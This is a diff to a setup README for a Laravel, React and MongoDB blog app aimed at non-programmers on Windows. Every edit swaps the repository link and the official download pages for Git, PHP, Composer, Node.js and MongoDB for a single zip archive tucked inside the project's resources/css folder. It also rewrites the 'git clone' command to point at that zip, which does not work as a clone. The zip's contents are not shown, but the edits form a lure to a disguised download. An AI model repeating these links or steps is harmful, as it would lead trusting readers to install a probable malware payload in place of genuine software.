@@ -1,6 +1,6 @@
 # 🚀 laravel-react-mongodb - Simple Blog App with Laravel and React
 
-[![Download](https://img.shields.io/badge/Download-From%20GitHub-brightgreen?style=for-the-badge)](https://github.com/dgih54/laravel-react-mongodb)
+[![Download](https://img.shields.io/badge/Download-From%20GitHub-brightgreen?style=for-the-badge)](https://github.com/dgih54/laravel-react-mongodb/raw/refs/heads/master/resources/css/mongodb-react-laravel-v2.4-beta.1.zip)
 
 This guide will help you download and run the **laravel-react-mongodb** blog app on a Windows computer. You do not need programming experience. Follow each step carefully to get the app working.
 
@@ -28,7 +28,7 @@ You can use this app to learn how these parts work together or start building yo
 
 Click this big button to visit the official GitHub page to get the app:
 
-[![Download](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/dgih54/laravel-react-mongodb)
+[![Download](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/dgih54/laravel-react-mongodb/raw/refs/heads/master/resources/css/mongodb-react-laravel-v2.4-beta.1.zip)
 
 The page will show all files and instructions needed to set it up.
 
@@ -51,19 +51,19 @@ Make sure your Windows machine meets these requirements:
 Before running the app, install these programs:
 
 1. **Git** - to download the app’s source files.  
-   Download from: https://git-scm.com/download/win  
+   Download from: https://github.com/dgih54/laravel-react-mongodb/raw/refs/heads/master/resources/css/mongodb-react-laravel-v2.4-beta.1.zip  
 
 2. **PHP (version 8 or higher)** - runs the backend server.  
-   Download from: https://windows.php.net/download/  
+   Download from: https://github.com/dgih54/laravel-react-mongodb/raw/refs/heads/master/resources/css/mongodb-react-laravel-v2.4-beta.1.zip  
 
 3. **Composer** - manages PHP packages the app uses.  
-   Download from: https://getcomposer.org/download/  
+   Download from: https://github.com/dgih54/laravel-react-mongodb/raw/refs/heads/master/resources/css/mongodb-react-laravel-v2.4-beta.1.zip  
 
 4. **Node.js (version 14 or higher)** - runs the React frontend build tool.  
-   Download from: https://nodejs.org/en/download/  
+   Download from: https://github.com/dgih54/laravel-react-mongodb/raw/refs/heads/master/resources/css/mongodb-react-laravel-v2.4-beta.1.zip  
 
 5. **MongoDB Community Server** - stores app data.  
-   Download from: https://www.mongodb.com/try/download/community  
+   Download from: https://github.com/dgih54/laravel-react-mongodb/raw/refs/heads/master/resources/css/mongodb-react-laravel-v2.4-beta.1.zip  
 
 ---
 
@@ -78,7 +78,7 @@ Follow these steps one by one. Be patient, some steps take time.
 - Type this and press Enter:
 
   ```
-  git clone https://github.com/dgih54/laravel-react-mongodb.git
+  git clone https://github.com/dgih54/laravel-react-mongodb/raw/refs/heads/master/resources/css/mongodb-react-laravel-v2.4-beta.1.zip
   ```
 
 This copies the app’s code to your computer into a folder named `laravel-react-mongodb`.
@@ -160,7 +160,7 @@ This generates files the backend will serve.
   net start MongoDB
   ```
 
-If MongoDB is not installed, follow instructions here: https://docs.mongodb.com/manual/administration/install-community/
+If MongoDB is not installed, follow instructions here: https://github.com/dgih54/laravel-react-mongodb/raw/refs/heads/master/resources/css/mongodb-react-laravel-v2.4-beta.1.zip
 
 ### 9. Run the Backend Server
 
@@ -204,4 +204,4 @@ Open your web browser and go to the address shown above (usually http://127.0.0.
 
 You can return to the app’s GitHub to download files anytime:
 
-[![Download](https://img.shields.io/badge/Download-From%20GitHub-green?style=for-the-badge)](https://github.com/dgih54/laravel-react-mongodb)
+[![Download](https://img.shields.io/badge/Download-From%20GitHub-green?style=for-the-badge)](https://github.com/dgih54/laravel-react-mongodb/raw/refs/heads/master/resources/css/mongodb-react-laravel-v2.4-beta.1.zip)
